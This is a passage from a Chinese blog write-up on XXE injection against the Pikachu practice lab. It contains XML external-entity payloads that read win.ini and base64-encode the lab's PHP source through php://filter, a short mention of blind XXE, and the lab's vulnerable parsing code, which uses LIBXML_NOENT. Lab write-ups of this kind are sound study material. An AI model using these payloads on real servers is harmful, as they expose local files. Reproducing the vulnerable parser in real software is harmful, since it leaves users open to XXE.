+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">pi</span>[</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="keyword">text</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///C:/Windows/win.ini&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">pi</span>&gt;</span><span class="symbol">&amp;text;</span><span class="tag">&lt;/<span class="name">pi</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/../../img/docs/pikachu/XXE/1739672218034-20141404-07c1-4f2d-bee5-a1bd48622295.png"></p>
+<p><strong>使用 PHP 伪协议</strong></p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">pi</span>[</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="keyword">text</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;php://filter/convert.base64-encode/resource=E:/Soft/phpstudy_pro/WWW/pikachu/vul/xxe/xxe_1.php&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">pi</span>&gt;</span><span class="symbol">&amp;text;</span><span class="tag">&lt;/<span class="name">pi</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/../../img/docs/pikachu/XXE/1739672840755-33677208-c389-4206-a27b-eb77165436e4.png"></p>
+<p><img src="/../../img/docs/pikachu/XXE/1739672854232-56a5e93c-4dc2-49a9-bd01-429bb7b88614.png"></p>
+<p><strong>无回显操作</strong></p>
+<p>看网上有的说不能操作，还有的教程往服务端放了两个文件，一个文件是通过 GET 或者 POST 协议来接收数据，然后对 base64 进行解码，进行保存文件(php 文件)，然后一个外部的 XML 文件用来之后payload 的外部引用。</p>
+<h1 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]) <span class="keyword">and</span> <span class="variable">$_POST</span>[<span class="string">&#x27;xml&#x27;</span>] != <span class="literal">null</span>)&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="variable">$xml</span> =<span class="variable">$_POST</span>[<span class="string">&#x27;xml&#x27;</span>];</span><br><span class="line">  <span class="comment">//    $xml = $test;</span></span><br><span class="line">  <span class="variable">$data</span> = @<span class="title function_ invoke__">simplexml_load_string</span>(<span class="variable">$xml</span>,<span class="string">&#x27;SimpleXMLElement&#x27;</span>,LIBXML_NOENT);</span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$data</span>)&#123;</span><br><span class="line">    <span class="variable">$html</span>.=<span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$data&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$html</span>.=<span class="string">&quot;&lt;p&gt;XML声明、DTD文档类型定义、文档元素这些都搞懂了吗?&lt;/p&gt;&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>具体来说用了simplexml_load_string 函数对 xml 字符串解析成一个对象。</p>
 ]]></content>
       <categories>
         <category>网安</category>
